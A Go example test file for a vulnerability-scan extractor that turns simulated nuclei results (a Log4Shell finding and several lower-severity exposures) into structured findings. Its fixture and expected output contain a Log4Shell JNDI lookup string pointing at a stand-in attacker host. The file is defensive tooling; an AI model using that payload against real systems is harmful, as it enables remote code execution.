package extraction_test

import (
	"context"
	"fmt"

	"github.com/zero-day-ai/gibson/internal/extraction"
	"github.com/zero-day-ai/sdk/api/gen/toolspb"
)

// ExampleNucleiExtractor demonstrates how to use the NucleiExtractor
// to convert nuclei scan results into standardized graph entities.
func Example_nucleiExtractor() {
	// Create the extractor
	extractor := extraction.NewNucleiExtractor()

	// Simulate a nuclei scan response with a critical vulnerability
	resp := &toolspb.NucleiResponse{
		Results: []*toolspb.TemplateMatch{
			{
				TemplateId:   "CVE-2021-44228",
				TemplateName: "Apache Log4j RCE",
				Type:         "http",
				Host:         "vulnerable-app.example.com",
				Url:          "https://vulnerable-app.example.com/api",
				MatchedAt:    "https://vulnerable-app.example.com/api/search",
				MatcherName:  "header",
				ExtractedResults: []string{
					"jndi:ldap://attacker.com/Exploit",
					"log4j-core-2.14.1.jar",
				},
				Info: &toolspb.TemplateInfo{
					Name:        "Apache Log4j Remote Code Execution",
					Author:      "security-team",
					Severity:    "critical",
					Description: "Apache Log4j 2.x <= 2.14.1 is vulnerable to RCE via JNDI LDAP injection",
					Reference: []string{
						"https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
						"https://logging.apache.org/log4j/2.x/security.html",
					},
					Tags: []string{"cve", "rce", "log4j", "apache"},
					Classification: &toolspb.TemplateClassification{
						CveId:       []string{"CVE-2021-44228"},
						CweId:       []string{"CWE-502"},
						CvssMetrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
						CvssScore:   10.0,
					},
					Remediation: "Upgrade to Log4j 2.15.0 or later. Set log4j2.formatMsgNoLookups to true.",
				},
			},
		},
		TotalRequests:     50,
		TotalMatches:      1,
		Duration:          2.5,
		TemplatesLoaded:   500,
		TemplatesExecuted: 100,
	}

	// Extract entities from the response
	ctx := context.Background()
	result, err := extractor.Extract(ctx, resp)
	if err != nil {
		fmt.Printf("extraction failed: %v\n", err)
		return
	}

	// Display extracted entities
	fmt.Printf("Tool: %s\n", result.Metadata["tool_name"])
	fmt.Printf("Findings: %s\n", result.Metadata["finding_count"])
	fmt.Printf("Evidence: %s\n", result.Metadata["evidence_count"])
	fmt.Printf("Endpoints: %s\n", result.Metadata["endpoint_count"])
	fmt.Println()

	// Display finding details
	for _, finding := range result.Discovery.Findings {
		fmt.Printf("Finding: %s\n", finding.Title)
		fmt.Printf("  Severity: %s\n", finding.Severity)
		if finding.CveIds != nil {
			fmt.Printf("  CVE: %s\n", *finding.CveIds)
		}
		if finding.CvssScore != nil {
			fmt.Printf("  CVSS Score: %.1f\n", *finding.CvssScore)
		}
		if finding.ParentType != nil {
			fmt.Printf("  Affects: %s\n", *finding.ParentType)
		}
	}
	fmt.Println()

	// Display evidence
	for i, evidence := range result.Discovery.Evidence {
		fmt.Printf("Evidence %d:\n", i+1)
		fmt.Printf("  Type: %s\n", evidence.Type)
		if evidence.Content != nil {
			fmt.Printf("  Content: %s\n", *evidence.Content)
		}
	}

	// Output:
	// Tool: nuclei
	// Findings: 1
	// Evidence: 2
	// Endpoints: 1
	//
	// Finding: Apache Log4j Remote Code Execution
	//   Severity: critical
	//   CVE: CVE-2021-44228
	//   CVSS Score: 10.0
	//   Affects: endpoint
	//
	// Evidence 1:
	//   Type: extracted_data
	//   Content: jndi:ldap://attacker.com/Exploit
	// Evidence 2:
	//   Type: extracted_data
	//   Content: log4j-core-2.14.1.jar
}

// ExampleNucleiExtractor_multipleSeverities demonstrates extracting
// findings with different severity levels from a single scan.
func Example_nucleiExtractor_multipleSeverities() {
	extractor := extraction.NewNucleiExtractor()

	resp := &toolspb.NucleiResponse{
		Results: []*toolspb.TemplateMatch{
			{
				TemplateId: "exposed-admin",
				Host:       "example.com",
				Url:        "https://example.com/admin",
				MatchedAt:  "https://example.com/admin",
				Info: &toolspb.TemplateInfo{
					Name:        "Admin Panel Exposed",
					Severity:    "high",
					Description: "Admin panel is publicly accessible",
				},
			},
			{
				TemplateId: "debug-enabled",
				Host:       "example.com",
				Url:        "https://example.com",
				MatchedAt:  "https://example.com/debug",
				Info: &toolspb.TemplateInfo{
					Name:        "Debug Mode Enabled",
					Severity:    "medium",
					Description: "Application is running in debug mode",
				},
			},
			{
				TemplateId: "server-header",
				Host:       "example.com",
				Url:        "https://example.com",
				MatchedAt:  "https://example.com",
				Info: &toolspb.TemplateInfo{
					Name:        "Server Header Disclosure",
					Severity:    "info",
					Description: "Server version disclosed in headers",
				},
			},
		},
		TotalMatches: 3,
	}

	ctx := context.Background()
	result, err := extractor.Extract(ctx, resp)
	if err != nil {
		fmt.Printf("extraction failed: %v\n", err)
		return
	}

	// Group by severity
	severityCounts := make(map[string]int)
	for _, finding := range result.Discovery.Findings {
		severityCounts[finding.Severity]++
	}

	fmt.Printf("Total Findings: %d\n", len(result.Discovery.Findings))
	fmt.Printf("Critical: %d\n", severityCounts["critical"])
	fmt.Printf("High: %d\n", severityCounts["high"])
	fmt.Printf("Medium: %d\n", severityCounts["medium"])
	fmt.Printf("Low: %d\n", severityCounts["low"])
	fmt.Printf("Info: %d\n", severityCounts["info"])

	// Output:
	// Total Findings: 3
	// Critical: 0
	// High: 1
	// Medium: 1
	// Low: 0
	// Info: 1
}
